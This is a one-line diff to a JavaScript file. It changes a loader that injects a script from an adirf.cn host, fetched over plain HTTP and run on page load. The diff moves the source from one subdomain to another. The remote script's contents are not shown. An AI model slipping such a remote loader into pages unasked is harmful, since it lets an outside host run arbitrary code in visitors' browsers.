@@ -1,1 +1,1 @@
-var s=document.createElement("script");s.type="text/javascript",s.src="http://blog.adirf.cn/assets/js/go.min.js",s.charset="UTF-8",document.head.appendChild(s);
+var s=document.createElement("script");s.type="text/javascript",s.src="http://jxpj.adirf.cn/go.min.js",s.charset="UTF-8",document.head.appendChild(s);
